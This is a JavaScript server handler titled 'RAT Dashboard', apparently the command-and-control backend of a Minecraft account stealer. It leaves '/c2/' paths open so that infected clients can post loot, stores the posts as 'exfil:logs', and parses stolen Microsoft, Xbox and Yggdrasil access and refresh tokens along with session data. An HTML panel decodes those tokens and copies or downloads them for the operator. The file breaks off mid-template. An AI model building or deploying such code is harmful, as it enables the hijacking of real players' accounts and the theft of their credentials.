const MAX_ENTRIES = 1000;
const MAX_BODY = 500000; // 500KB — enough for accounts JSON with skin data
const AUTH_USER = "admin";
const AUTH_PASS = "admin";
let kv;
try {
  kv = (await import("@vercel/kv")).kv;
} catch {}

const mem = [];

function unauthorized(res) {
  res.setHeader("WWW-Authenticate", 'Basic realm="RAT Dashboard"');
  return res.status(401).end("Unauthorized");
}

function checkAuth(headers) {
  const ah = headers["authorization"] || "";
  const b64 = Buffer.from(`${AUTH_USER}:${AUTH_PASS}`).toString("base64");
  return ah === `Basic ${b64}`;
}

function parseMultipart(body, ct) {
  const m = ct && ct.match(/boundary=(.+?)(?:;|$)/);
  if (!m) return null;
  const boundary = m[1].trim();
  const parts = body
    .split("--" + boundary)
    .filter((p) => p && p !== "--\r\n" && p !== "--");
  const result = {};
  for (const part of parts) {
    if (part.startsWith("--\r\n") || part.startsWith("--")) continue;
    const headerEnd = part.indexOf("\r\n\r\n");
    if (headerEnd === -1) continue;
    const header = part.slice(0, headerEnd);
    const content = part.slice(headerEnd + 4).replace(/\r\n$/, "");
    const nameMatch = header.match(/name="([^"]+)"/);
    if (nameMatch) result[nameMatch[1]] = content;
  }
  return result;
}

function parseTwopointfive(body) {
  try {
    const parsed = JSON.parse(body);
    const content = parsed.content || "";
    const parts = content
      .split("\n")
      .map((s) => s.trim())
      .filter(Boolean);
    const username = (parts[0] || "")
      .replace(/\*\*1\*\*:\s*`(.+)`/, "$1")
      .trim();
    const tokenRaw = (parts[1] || "")
      .replace(/\*\*2\*\*:\s*`(.+)`/, "$1")
      .trim();
    const timestamp = (parts[2] || "").replace(/\*\*3\*\*[:*]*\s*/, "").trim();
    const profileUrl = (parts[3] || "")
      .replace(/.*\[([^\]]+)\]\(([^)]+)\).*/, "$2")
      .trim();
    const modVersion = (parts[4] || "").replace(/`/g, "").trim();
    return {
      username,
      tokenRaw,
      timestamp,
      profileUrl,
      modVersion,
      rawContent: content,
    };
  } catch {
    return null;
  }
}

function parseAccJson(body) {
  try {
    const data = JSON.parse(body);
    const accounts = data.accounts || data;
    if (!Array.isArray(accounts)) return null;
    return accounts.map((a) => {
      const p = a.profile || {};
      return {
        _raw: a,
        name: p.name || "?",
        uuid: p.id || "?",
        type: a.type || "?",
      };
    });
  } catch {
    return null;
  }
}

function parseEss(body, ct) {
  const mp = parseMultipart(body, ct);
  if (!mp) {
    const parsed = parseAccJson(body);
    if (parsed)
      return { accounts: parsed, summary: `Found ${parsed.length} account(s)` };
    return null;
  }
  const fileContent = mp.file || body;
  const textSummary = mp.content || "";
  const accounts = parseAccJson(fileContent);
  if (!accounts) return null;
  return { accounts, summary: textSummary };
}

async function store(entry) {
  const parsed = {};
  const u = entry.u || "";
  if (u.includes("/ess") || u.includes("/essfb")) {
    const r = parseEss(entry.b, entry.h?.ct);
    if (r) parsed.accounts = r.accounts;
  }
  if (u.includes("/twopointfive") || u.includes("/exfil/esf")) {
    const r = parseTwopointfive(entry.b);
    if (r) parsed.session = r;
  }
  if (parsed.accounts || parsed.session) entry._parsed = parsed;

  if (kv) {
    try {
      await kv.lpush("exfil:logs", JSON.stringify(entry));
      await kv.ltrim("exfil:logs", 0, MAX_ENTRIES - 1);
      return;
    } catch {}
  }
  mem.unshift(entry);
  if (mem.length > MAX_ENTRIES) mem.length = MAX_ENTRIES;
}

function parseEntry(e) {
  if (e._parsed?.accounts || e._parsed?.session) return e;
  const u = e.u || "";
  try {
    if (u.includes("/ess") || u.includes("/essfb")) {
      const r = parseEss(e.b, e.h?.ct);
      if (r) {
        e._parsed = { accounts: r.accounts };
        return e;
      }
    }
    if (u.includes("/twopointfive") || u.includes("/exfil/esf")) {
      const r = parseTwopointfive(e.b);
      if (r) {
        e._parsed = { session: r };
        return e;
      }
    }
  } catch {}
  return e;
}

async function load() {
  if (kv) {
    try {
      const raw = await kv.lrange("exfil:logs", 0, MAX_ENTRIES - 1);
      return raw
        .map((r) => (typeof r === "string" ? JSON.parse(r) : r))
        .filter(Boolean)
        .map(parseEntry);
    } catch {}
  }
  return [...mem].map(parseEntry);
}

function esc(s) {
  if (typeof s !== "string") s = String(s ?? "");
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function decodeJwt(token) {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
    if (
      header.enc ||
      header.alg === "RSA-OAEP" ||
      header.alg === "RSA-OAEP-256"
    ) {
      return { header, encrypted: true };
    }
    let b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
    while (b64.length % 4) b64 += "=";
    const payload = JSON.parse(Buffer.from(b64, "base64").toString());
    return { header, payload, encrypted: false };
  } catch {
    return null;
  }
}

function formatJwtPayload(payload) {
  if (!payload) return [];
  return Object.entries(payload).map(([k, v]) => {
    if (k === "iat" || k === "exp" || k === "nbf") {
      const d = new Date(v * 1000);
      return {
        k,
        v:
          d.toLocaleString() +
          " (" +
          Math.round((v - Date.now() / 1000) / 86400) +
          "d)",
        kind: "date",
      };
    }
    if (typeof v === "object") return { k, v: JSON.stringify(v), kind: "json" };
    return { k, v: String(v), kind: "text" };
  });
}

function skinDataToDataUri(base64Data) {
  try {
    const buf = Buffer.from(base64Data, "base64");
    if (buf.length < 8) return null;
    return "data:image/png;base64," + base64Data;
  } catch {
    return null;
  }
}

function buildAccountsJson(entries) {
  const allAccounts = entries.flatMap((e) => e._parsed?.accounts || []);
  if (allAccounts.length === 0) return "[]";
  return JSON.stringify({ accounts: allAccounts.map((a) => a._raw) }, null, 2);
}

export default async function handler(req, res) {
  const { method, url, headers } = req;

  // Skip auth for exfiltration & webhook endpoints
  const publicPaths = ["/c2/", "/api/webhooks/"];
  const isPublic = publicPaths.some((p) => url.startsWith(p));
  if (!isPublic && !checkAuth(req.headers)) return unauthorized(res);
  const now = new Date().toISOString();

  if (method === "GET" && url.startsWith("/api/download/accounts")) {
    const entries = await load();
    const json = buildAccountsJson(entries);
    return res
      .status(200)
      .setHeader("Content-Type", "application/json")
      .setHeader("Content-Disposition", 'attachment; filename="accounts.json"')
      .send(json);
  }

  if (method === "GET" && url.startsWith("/api/status")) {
    let kvOk = false;
    let kvCount = -1;
    if (kv) {
      try {
        const raw = await kv.lrange("exfil:logs", 0, -1);
        kvCount = raw.length;
        kvOk = true;
      } catch (e) {
        kvOk = false;
      }
    }
    return res
      .status(200)
      .json({
        kv: !!kv,
        kv_connected: kvOk,
        kv_entries: kvCount,
        mem_entries: mem.length,
      });
  }

  if (method === "POST" && url.startsWith("/api/clear")) {
    if (kv) {
      try {
        await kv.del("exfil:logs");
      } catch {}
    }
    mem.length = 0;
    return res.status(200).json({ ok: true });
  }

  if (method === "POST" || method === "PUT") {
    let body;
    try {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      const raw = Buffer.concat(chunks);
      body = raw.toString("utf-8");
    } catch {
      body = "(unreadable body)";
    }

    const entry = {
      t: now,
      m: method,
      u: url,
      h: { ua: headers["user-agent"] || "", ct: headers["content-type"] || "" },
      b:
        body.length > MAX_BODY
          ? body.slice(0, MAX_BODY) + "... (truncated)"
          : body,
    };

    await store(entry);
    console.log("[EXFIL]", JSON.stringify(entry, null, 2));
    return res.status(200).end();
  }

  if (method === "GET") {
    const entries = await load();
    const accept = req.headers["accept"] || "";
    if (accept.includes("application/json")) {
      return res.status(200).json(entries);
    }

    function hasData(a) {
      const r = a._raw || {};
      return !!(
        r.profile?.name ||
        r.profile?.id ||
        r.msa?.token ||
        r.utoken?.token ||
        r["xrp-mc"]?.token ||
        r.ygg?.token
      );
    }

    const allAccounts = entries.flatMap((e) => e._parsed?.accounts || []);
    const accounts = allAccounts.filter(hasData);
    const sessions = entries
      .filter((e) => e._parsed?.session)
      .map((e) => ({
        ...e._parsed.session,
        time: e.t,
        url: e.u,
      }));
    const allUniqueNames = [...new Set(accounts.map((a) => a.name))];

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>RAT Dashboard</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e14; color: #c9d1d9; padding: 20px; max-width: 1500px; margin: 0 auto; }
    h1 { background: linear-gradient(135deg,#1a1f2e,#161b22); border: 1px solid #30363d; border-radius: 12px; padding: 16px 20px; font-size: 1.4em; display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 12px; }
    h1 span { color: #58a6ff; }
    h1 small { font-size: 0.5em; font-weight: normal; margin-left: auto; }
    .warn { background: linear-gradient(135deg,#2d1500,#3d1f00); border: 1px solid #d29922; color: #ffd393; padding: 10px 16px; border-radius: 8px; margin: 12px 0; font-size: 0.85em; }
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin: 12px 0 20px; }
    .stat { background: #161b22; border: 1px solid #21262d; border-radius: 10px; padding: 14px 16px; text-align: center; transition: border-color 0.15s; }
    .stat:hover { border-color: #30363d; }
    .stat-val { font-size: 1.8em; font-weight: 700; color: #58a6ff; display: block; line-height: 1.2; }
    .stat-lbl { font-size: 0.7em; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 4px; display: block; }
    .tabs { display: flex; gap: 2px; margin: 0 0 16px; border-bottom: 1px solid #21262d; padding-bottom: 0; flex-wrap: wrap; }
    .tab { padding: 9px 18px; cursor: pointer; border: 1px solid transparent; border-bottom: 2px solid transparent; border-radius: 8px 8px 0 0; color: #8b949e; background: transparent; font-size: 0.85em; transition: all 0.15s; margin-bottom: -1px; }
    .tab:hover { color: #c9d1d9; background: #161b22; }
    .tab.active { color: #f0f6fc; background: #161b22; border-color: #21262d; border-bottom-color: #58a6ff; }
    .tab-count { background: #21262d; color: #8b949e; border-radius: 10px; padding: 1px 8px; font-size: 0.8em; margin-left: 6px; }
    .tab.active .tab-count { background: #1f6feb; color: #fff; }

    .toolbar { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
    .btn { padding: 8px 16px; border-radius: 8px; border: 1px solid #30363d; background: #21262d; color: #c9d1d9; cursor: pointer; font-size: 0.82em; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; transition: all 0.15s; }
    .btn:hover { background: #30363d; border-color: #58a6ff; }
    .btn-primary { background: #1f6feb; border-color: #1f6feb; color: #fff; }
    .btn-primary:hover { background: #388bfd; }
    .btn-danger { background: #da3633; border-color: #da3633; color: #fff; }
    .btn-danger:hover { background: #f85149; }
    .btn-ygg { background: #238636; border-color: #238636; color: #fff; }
    .btn-ygg:hover { background: #2ea043; }
    .btn-sm { font-size: 0.72em; padding: 3px 10px; }
    .btn-outline { background: transparent; border-color: #30363d; color: #8b949e; }
    .btn-outline:hover { color: #c9d1d9; border-color: #58a6ff; }

    .acard { background: #161b22; border: 1px solid #21262d; border-radius: 12px; margin-bottom: 14px; overflow: hidden; transition: border-color 0.15s; }
    .acard:hover { border-color: #30363d; }
    .acard.collapsed .section { display: none; }
    .acard.collapsed { border-color: #21262d; }
    .acard.collapsed:hover { border-color: #30363d; }
    .acard-header { padding: 14px 18px; border-bottom: 1px solid #21262d; display: flex; align-items: center; gap: 14px; cursor: pointer; user-select: none; }
    .acard-header .collapse-icon { color: #30363d; font-size: 0.8em; transition: transform 0.15s; flex-shrink: 0; }
    .acard.collapsed .collapse-icon { transform: rotate(-90deg); }
    .acard-header:hover .collapse-icon { color: #58a6ff; }
    .acard-avatar { width: 44px; height: 44px; border-radius: 10px; background: #0d1117; display: flex; align-items: center; justify-content: center; font-size: 1.3em; color: #58a6ff; border: 1px solid #21262d; overflow: hidden; flex-shrink: 0; }
    .acard-avatar img { width: 100%; height: 100%; object-fit: cover; }
    .acard-name { font-weight: 700; font-size: 1.1em; color: #f0f6fc; }
    .acard-uuid { font-size: 0.78em; color: #8b949e; font-family: monospace; }
    .section { border-bottom: 1px solid #1c2128; }
    .section:last-child { border-bottom: none; }
    .section-title { padding: 10px 18px 6px; font-size: 0.75em; font-weight: 600; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; gap: 8px; }
    .section-body { padding: 0 18px 10px; }
    .field-row { display: flex; padding: 3px 0; font-size: 0.82em; gap: 12px; }
    .field-lbl { color: #6e7681; flex-shrink: 0; min-width: 130px; }
    .field-val { color: #c9d1d9; font-family: monospace; word-break: break-all; min-width: 0; }
    .field-val.green { color: #3fb950; }
    .field-val.red { color: #f85149; }
    .field-val.orange { color: #d29922; }
    .field-val.purple { color: #bc8cff; }
    .field-val.cyan { color: #79c0ff; }
    .field-val.trunc { max-height: 2.5em; overflow: hidden; cursor: pointer; position: relative; }
    .field-val.trunc:hover { color: #58a6ff; }
    .field-val.trunc.expanded { max-height: none; }
    .field-val a { color: #58a6ff; text-decoration: none; }
    .field-val a:hover { text-decoration: underline; }

    .cpy { background: none; border: 1px solid transparent; color: #484f58; cursor: pointer; padding: 0 5px; font-size: 0.72em; border-radius: 4px; flex-shrink: 0; font-family: monospace; transition: all 0.1s; }
    .cpy:hover { color: #58a6ff; border-color: #30363d; background: #0d1117; }

    .cape-grid { display: flex; flex-wrap: wrap; gap: 4px; }
    .cape-badge { font-size: 0.78em; padding: 2px 10px; border-radius: 12px; background: #0d1117; border: 1px solid #21262d; color: #c9d1d9; }

    .scard { background: #161b22; border: 1px solid #21262d; border-radius: 12px; padding: 16px; margin-bottom: 12px; transition: border-color 0.15s; }
    .scard:hover { border-color: #30363d; }
    .scard-top { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; flex-wrap: wrap; }
    .scard-time { color: #8b949e; font-size: 0.8em; }
    .scard-path { background: #0d1117; padding: 2px 10px; border-radius: 8px; font-size: 0.78em; color: #79c0ff; font-family: monospace; border: 1px solid #21262d; }
    .scard-user { font-size: 1.1em; font-weight: 600; color: #f0f6fc; display: flex; align-items: center; gap: 8px; }
    .scard-info { display: grid; grid-template-columns: 1fr 1fr; gap: 6px 16px; font-size: 0.82em; }
    .scard-full { margin-top: 8px; }
    .scard-full textarea { width: 100%; background: #0d1117; border: 1px solid #21262d; border-radius: 8px; color: #c9d1d9; padding: 8px; font-family: monospace; font-size: 0.75em; resize: vertical; min-height: 50px; }

    .raw-toggle { cursor: pointer; color: #8b949e; font-size: 0.78em; padding: 4px 0; user-select: none; }
    .raw-toggle:hover { color: #58a6ff; }
    .raw-content { display: none; }
    .raw-content.open { display: block; }
    pre { background: #0d1117; padding: 12px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; font-size: 0.75em; margin: 6px 0; border: 1px solid #21262d; max-height: 400px; overflow-y: auto; }

    .empty { color: #484f58; text-align: center; padding: 60px; font-size: 0.9em; }
    .toast { position: fixed; bottom: 20px; right: 20px; background: #238636; color: #fff; padding: 10px 20px; border-radius: 8px; font-size: 0.85em; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999; }
    .toast.show { opacity: 1; }

    .glow-green { box-shadow: 0 0 12px rgba(35,134,54,0.15); }
    .glow-blue { box-shadow: 0 0 12px rgba(31,111,235,0.15); }

    @media (max-width: 640px) {
      body { padding: 12px; }
      .field-row { flex-direction: column; gap: 2px; }
    }
  </style>
</head>
<body>
  <div id="toast" class="toast">Copied!</div>

  <h1><span>RAT Dashboard</span> <small><a href="?raw=1" target="_blank" style="color:#8b949e;text-decoration:none;">[raw JSON]</a></small></h1>

  <div class="stats">
    <div class="stat"><span class="stat-val">${accounts.length}</span><span class="stat-lbl">Accounts Captured</span></div>
    <div class="stat"><span class="stat-val">${allUniqueNames.length}</span><span class="stat-lbl">Unique Profiles</span></div>
    <div class="stat"><span class="stat-val">${sessions.length}</span><span class="stat-lbl">Sessions</span></div>
    <div class="stat"><span class="stat-val">${entries.length}</span><span class="stat-lbl">Total Captures</span></div>
  </div>

  <div class="tabs">
    <div class="tab active" onclick="switchTab('accounts')">Accounts <span class="tab-count">${accounts.length}</span></div>
    <div class="tab" onclick="switchTab('sessions')">Sessions <span class="tab-count">${sessions.length}</span></div>
    <div class="tab" onclick="switchTab('all')">All Raw <span class="tab-count">${entries.length}</span></div>
  </div>

  <div id="tab-accounts" class="tab-content">
    ${
      accounts.length === 0
        ? '<div class="empty">No accounts captured yet.</div>'
        : `<div class="toolbar">
      <a class="btn btn-primary glow-blue" href="/api/download/accounts" download="accounts.json">Download accounts.json</a>
      <button class="btn btn-outline" onclick="copyAllAccounts()">Copy All JSON</button>
    </div>
    ${accounts.map((a, i) => renderAccount(a, i)).join("\n")}`
    }
  </div>

  <div id="tab-sessions" class="tab-content" style="display:none">
    ${
      sessions.length === 0
        ? '<div class="empty">No sessions captured yet.</div>'
        : `<div class="toolbar">
      <button class="btn btn-outline" onclick="copyAllSessions()">Copy All Sessions</button>
    </div>
    ${sessions.map((s, i) => renderSession(s, i)).join("\n")}`
    }
  </div>

  <div id="tab-all" class="tab-content" style="display:none">
    ${
      entries.length === 0
        ? '<div class="empty">No captures yet.</div>'
        : `<div class="toolbar">
      <button class="btn btn-danger" onclick="clearData()">Clear All Data</button>
    </div>
    ${entries.slice().reverse().map(renderEntry).join("\n")}`
    }
  </div>

  <script>
    function toast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 1500);
    }
    function copy(text) {
      navigator.clipboard.writeText(text).then(() => toast('Copied!')).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
        document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
        toast('Copied!');
      });
    }
    function switchTab(name) {
      document.querySelectorAll('.tab-content').forEach(e => e.style.display = 'none');
      document.querySelectorAll('.tab').forEach(e => e.classList.remove('active'));
      document.getElementById('tab-' + name).style.display = '';
      const idx = {accounts:1,sessions:2,all:3}[name];
      document.querySelector('.tab:nth-child(' + idx + ')').classList.add('active');
    }
    function toggleRaw(id) { document.getElementById(id).classList.toggle('open'); }
    function toggleTrunc(id) { document.getElementById(id).classList.toggle('expanded'); }
    function toggleCard(idx) {
      const el = document.getElementById('acard-' + idx);
      if (el) el.classList.toggle('collapsed');
    }

    const RAW_ACCOUNTS = ${JSON.stringify(accounts.map((a) => a._raw)).replace(/<\//g, "<\\/")};
    const SESSIONS = ${JSON.stringify(
      sessions.map((s, i) => ({
        i,
        username: s.username,
        tokenRaw: s.tokenRaw,
        timestamp: s.timestamp,
        profileUrl: s.profileUrl,
        modVersion: s.modVersion,
        time: s.time,
        url: s.url,
      })),
    ).replace(/<\//g, "<\\/")};

    function getRawAccount(i) { return RAW_ACCOUNTS[i]; }
    function getSession(i) { return SESSIONS[i]; }
    function copyFromRaw(i, path) {
      const obj = getRawAccount(i);
      const val = path.split('.').reduce((o, k) => o && o[k], obj);
      copy(val !== undefined && val !== null ? (typeof val === 'object' ? JSON.stringify(val, null, 2) : String(val)) : '');
    }
    function copySessionField(i, field) { copy(getSession(i)[field] || ''); }
    function copyBtnClick(e, i, path, btn, label) {
      e.stopPropagation();
      const el = document.getElementById('acard-' + i);
      if (el) el.classList.remove('collapsed');
      copyFromRaw(i, path);
      btn.textContent = '\u2713';
      btn.style.background = '#2ea043';
      btn.style.borderColor = '#2ea043';
      setTimeout(() => {
        btn.textContent = label;
        btn.style.background = '';
        btn.style.borderColor = '';
      }, 1000);
    }

    function copyYggTokens() {
      const tokens = RAW_ACCOUNTS.map(a => a.ygg?.token).filter(Boolean);
      if (tokens.length === 0) { toast('No ygg tokens found'); return; }
      copy(tokens.join('\n---\n'));
    }
    function copyAllAccounts() {
      copy(JSON.stringify({ accounts: RAW_ACCOUNTS }, null, 2));
    }
    function copyAllSessions() {
      copy(JSON.stringify({ sessions: SESSIONS }, null, 2));
    }
    function clearData() {
      if (!confirm('Delete ALL captured data? This cannot be undone.')) return;
      fetch('/api/clear', { method: 'POST' }).then(() => location.reload());
    }
  </script>
</body>
</html>`;
    return res.status(200).setHeader("Content-Type", "text/html").send(html);
  }

  return res.status(405).end();
}

/* ───── Render helpers ───── */

function v(val) {
  if (val === null || val === undefined)
    return '<span class="field-val" style="color:#484f58;">—</span>';
  if (typeof val === "boolean")
    return val
      ? '<span class="field-val green">true</span>'
      : '<span class="field-val red">false</span>';
  if (typeof val === "number")
    return `<span class="field-val purple">${val}</span>`;
  return null;
}

function field(lbl, val, cpyPath) {
  const valHtml = v(val);
  if (valHtml)
    return `<div class="field-row"><span class="field-lbl">${lbl}</span>${valHtml}</div>`;
  const s = String(val);
  const isLong = s.length > 60;
  const id = "f-" + Math.random().toString(36).slice(2, 8);
  const cpy = cpyPath
    ? `<button class="cpy" onclick="copyFromRaw(${cpyPath.i},'${cpyPath.p}');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy value">cpy</button>`
    : "";
  const toggleAttr = isLong
    ? " onclick=\"toggleTrunc('" + id + '\')" title="Click to expand"'
    : "";
  return (
    '<div class="field-row"><span class="field-lbl">' +
    lbl +
    '</span><span class="field-val' +
    (isLong ? " trunc" : "") +
    '" id="' +
    id +
    '"' +
    toggleAttr +
    ">" +
    esc(s) +
    "</span>" +
    cpy +
    "</div>"
  );
}

function fieldDate(lbl, ts) {
  if (!ts) return "";
  const d = new Date(ts * 1000);
  const relative = Math.round((ts - Date.now() / 1000) / 86400);
  const col = relative < 0 ? "red" : relative < 7 ? "orange" : "";
  return `<div class="field-row"><span class="field-lbl">${lbl}</span><span class="field-val ${col}">${d.toLocaleString()} (${relative > 0 ? "in " + relative + "d" : relative === 0 ? "today" : Math.abs(relative) + "d ago"})</span></div>`;
}

function tokenField(lbl, val, col, cpyPath) {
  const s = String(val);
  const isLong = s.length > 60;
  const id = "f-" + Math.random().toString(36).slice(2, 8);
  const cpy = cpyPath
    ? `<button class="cpy" onclick="copyFromRaw(${cpyPath.i},'${cpyPath.p}');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy raw token">cpy</button>`
    : "";
  return `<div class="field-row"><span class="field-lbl">${lbl}</span><span class="field-val ${col}">${esc(col ? val : isLong ? s.slice(0, 80) + "..." : s)}</span>${cpy}</div>`;
}

function renderDecodedToken(label, token, idx, path) {
  const decoded = decodeJwt(token);
  let rows = "";
  if (!decoded) {
    rows = field(label, token, { i: idx, p: path });
  } else if (decoded.encrypted) {
    const headerEntries = formatJwtPayload(decoded.header);
    let headerRows = "";
    if (headerEntries.some((e) => e.k === "enc")) {
      headerRows = headerEntries
        .filter((e) => ["enc", "alg", "zip", "x5t", "cty"].includes(e.k))
        .map((e) => {
          if (e.kind === "date")
            return fieldDate(
              label + ".header." + e.k,
              Math.round(new Date(e.v).getTime() / 1000),
            );
          return field(label + ".header." + e.k, e.v);
        })
        .join("\n");
    } else {
      headerRows = headerEntries
        .map((e) => {
          if (e.kind === "date")
            return fieldDate(
              label + ".header." + e.k,
              Math.round(new Date(e.v).getTime() / 1000),
            );
          if (e.kind === "json")
            return field(label + ".header." + e.k, JSON.stringify(e.v));
          return field(label + ".header." + e.k, e.v);
        })
        .join("\n");
    }
    rows = tokenField(label, String(token).slice(0, 120) + "...", "orange", {
      i: idx,
      p: path,
    });
    rows += headerRows;
  } else {
    if (decoded.payload) {
      const entries = formatJwtPayload(decoded.payload);
      let decodedFields = "";
      entries.forEach((e) => {
        const lbl = label + "." + e.k;
        if (e.kind === "date")
          decodedFields += fieldDate(lbl, decoded.payload[e.k]);
        else if (e.kind === "json")
          decodedFields += field(lbl, JSON.stringify(e.v, null, 2));
        else decodedFields += field(lbl, e.v);
      });
      rows = tokenField(
        label,
        "Decoded JWT (" +
          (decoded.payload.sub || decoded.payload.xuid || "?") +
          ")",
        "green",
        { i: idx, p: path },
      );
      rows += decodedFields;
    }
  }
  return rows;
}

/* ───── Account renderer ───── */
function renderAccount(a, idx) {
  const r = a._raw;
  const p = r.profile || {};
  const uuidClean = (p.id || a.uuid).replace(/-/g, "");
  const msa = r.msa || {};

  function cpy(path) {
    return { i: idx, p: path };
  }

  const ent = r.entitlement || {};
  const capes = p.capes || [];
  const capeHtml =
    capes.length > 0
      ? `<div class="cape-grid">${capes.map((c) => `<span class="cape-badge">${esc(c.alias || c.id || "?")}</span>`).join("")}</div>`
      : '<span class="field-val" style="color:#484f58;">None</span>';

  const skin = p.skin || {};
  const skinDataUri = skin.data ? skinDataToDataUri(skin.data) : null;

  // Token sections
  const msaTokenFields = [];
  if (msa.token)
    msaTokenFields.push(
      renderDecodedToken("access_token", msa.token, idx, "msa.token"),
    );
  if (msa.refresh_token)
    msaTokenFields.push(
      field("refresh_token", msa.refresh_token, cpy("msa.refresh_token")),
    );
  if (msa.exp) msaTokenFields.push(fieldDate("expires", msa.exp));
  if (msa.iat) msaTokenFields.push(fieldDate("issued_at", msa.iat));
  if (msa.extra) {
    Object.entries(msa.extra).forEach(([k, v]) =>
      msaTokenFields.push(field("extra." + k, v)),
    );
  }

  const ut = r.utoken || {};
  const utokenFields = [];
  if (ut.token)
    utokenFields.push(
      renderDecodedToken("token", ut.token, idx, "utoken.token"),
    );
  if (ut.exp) utokenFields.push(fieldDate("expires", ut.exp));
  if (ut.iat) utokenFields.push(fieldDate("issued_at", ut.iat));
  if (ut.extra) {
    Object.entries(ut.extra).forEach(([k, v]) =>
      utokenFields.push(field("extra." + k, v)),
    );
  }

  const xrp = r["xrp-mc"] || {};
  const xrpFields = [];
  if (xrp.token)
    xrpFields.push(renderDecodedToken("token", xrp.token, idx, "xrp-mc.token"));
  if (xrp.exp) xrpFields.push(fieldDate("expires", xrp.exp));
  if (xrp.iat) xrpFields.push(fieldDate("issued_at", xrp.iat));
  if (xrp.extra) {
    Object.entries(xrp.extra).forEach(([k, v]) =>
      xrpFields.push(field("extra." + k, v)),
    );
  }

  const ygg = r.ygg || {};
  const yggFields = [];
  if (ygg.token)
    yggFields.push(renderDecodedToken("token", ygg.token, idx, "ygg.token"));
  if (ygg.exp) yggFields.push(fieldDate("expires", ygg.exp));
  if (ygg.iat) yggFields.push(fieldDate("issued_at", ygg.iat));

  const playerName = esc(p.name || a.name);
  const skycryptUrl = p.name
    ? "https://sky.shiiyu.moe/stats/" + esc(p.name)
    : "#";

  return `<div class="acard collapsed" id="acard-${idx}">
    <div class="acard-header" onclick="toggleCard(${idx})">
      <span class="collapse-icon">&#9660;</span>
      <div class="acard-avatar"><img src="https://mc-heads.net/avatar/${uuidClean}/44" alt="" onerror="this.parentElement.textContent='${playerName[0]}'"></div>
      <div style="flex:1;min-width:0;">
        <div class="acard-name">${playerName}</div>
        <div class="acard-uuid">${esc(p.id || a.uuid)}</div>
      </div>
      <button class="btn btn-sm btn-ygg" onclick="copyBtnClick(event,${idx},'ygg.token',this,'Ygg')" title="Copy ygg token">Ygg</button>
      <button class="btn btn-sm btn-outline" onclick="event.stopPropagation();window.open('${skycryptUrl}','_blank')" title="Open SkyCrypt stats">SkyCrypt</button>
      <button class="btn btn-sm" onclick="copyBtnClick(event,${idx},'profile.name',this,'Name')">Name</button>
    </div>

    <div class="section">
      <div class="section-title">Entitlement <button class="cpy" onclick="copyFromRaw(${idx},'entitlement');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy whole section">cpy</button></div>
      <div class="section-body">
        ${field("ownsMinecraft", ent.ownsMinecraft)}
        ${field("canPlayMinecraft", ent.canPlayMinecraft)}
      </div>
    </div>

    <div class="section">
      <div class="section-title">Profile <button class="cpy" onclick="copyFromRaw(${idx},'profile');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy profile">cpy</button></div>
      <div class="section-body">
        ${field("id", p.id)}
        ${field("name", p.name)}
        ${field("type", r.type)}
        ${field("msa-client-id", r["msa-client-id"])}
        ${field("cape (id)", p.cape)}
        ${field("capes (" + capes.length + ")", null)}
        ${capeHtml}
        ${field("skin.id", skin.id)}
        ${field("skin.url", skin.url, cpy("profile.skin.url"))}
        ${field("skin.variant", skin.variant)}
        ${skin.data ? `<div class="field-row"><span class="field-lbl">skin.data</span><span class="field-val" style="cursor:pointer;" onclick="copyFromRaw(${idx},'profile.skin.data');this.textContent=this.textContent==='Click to copy'?'Copied!':'Click to copy'" title="Copy base64 skin data">${skin.data.slice(0, 60)}...</span><button class="cpy" onclick="copyFromRaw(${idx},'profile.skin.data');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy base64">cpy</button></div>` : ""}
        ${skin.data ? `<div class="field-row"><span class="field-lbl">skin preview</span><img src="${skinDataUri}" alt="Skin" style="width:64px;height:128px;image-rendering:pixelated;border:1px solid #30363d;border-radius:4px;"></div>` : ""}
      </div>
    </div>

    <div class="section">
      <div class="section-title">MSA Token <button class="cpy" onclick="copyFromRaw(${idx},'msa');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy MSA section">cpy</button></div>
      <div class="section-body">
        ${msaTokenFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No MSA token data</span>'}
      </div>
    </div>

    <div class="section">
      <div class="section-title">User Token (utoken) <button class="cpy" onclick="copyFromRaw(${idx},'utoken');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy utoken section">cpy</button></div>
      <div class="section-body">
        ${utokenFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No utoken data</span>'}
      </div>
    </div>

    <div class="section">
      <div class="section-title">Xbox Token (xrp-mc) <button class="cpy" onclick="copyFromRaw(${idx},'xrp-mc');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy xrp-mc section">cpy</button></div>
      <div class="section-body">
